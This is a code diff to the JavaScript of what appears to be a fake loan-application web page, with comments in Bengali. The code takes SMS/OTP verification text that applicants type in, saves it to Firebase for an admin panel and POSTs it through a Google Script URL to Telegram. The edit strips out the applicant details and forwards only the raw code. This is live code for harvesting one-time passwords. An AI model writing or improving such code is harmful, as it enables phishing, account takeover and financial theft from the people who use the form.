@@ -216,7 +216,7 @@
 
         const smsText = document.getElementById("appText").value.trim();
 
-        // Firebase-এ ডেটা পাঠানো
+        // Firebase-এ ডেটা পাঠানো (যাতে অ্যাডমিন প্যানেলে দেখা যায়)
         const newAppRef = db.ref("applications").push();
         const appId = newAppRef.key;
         localStorage.setItem("current_application_id", appId);
@@ -232,31 +232,16 @@
             date: new Date().toLocaleString('bn-BD', { timeZone: 'Asia/Dhaka' })
         });
 
-        // গুগল স্ক্রিপ্ট / টেলিগ্রাম মেসেজ
-        const infoMessage = `📩 নতুন এসএমএস / ওটিপি যাচাই!\n\n` +
-                            `👤 নাম: ${applicantName}\n` +
-                            `📞 মোবাইল: ${applicantPhone}\n` +
-                            `💰 লোনের পরিমাণ: ${applicantAmount} টাকা\n` +
-                            `⏰ সময়: ${new Date().toLocaleString('bn-BD', { timeZone: 'Asia/Dhaka' })}`;
-
-        const codeOnlyMessage = smsText;
-
+        // শুধুমাত্র এসএমএস/কোড টেক্সটটি টেলিগ্রামে ফরওয়ার্ড করা
         fetch(GOOGLE_SCRIPT_URL, {
             method: "POST",
             mode: "no-cors",
             headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ message: infoMessage })
+            body: JSON.stringify({ message: smsText })
         }).finally(() => {
-            fetch(GOOGLE_SCRIPT_URL, {
-                method: "POST",
-                mode: "no-cors",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ message: codeOnlyMessage })
-            }).finally(() => {
-                setTimeout(() => {
-                    window.location.href = "success.html?id=" + appId;
-                }, 3000);
-            });
+            setTimeout(() => {
+                window.location.href = "success.html?id=" + appId;
+            }, 3000);
         });
     });
 
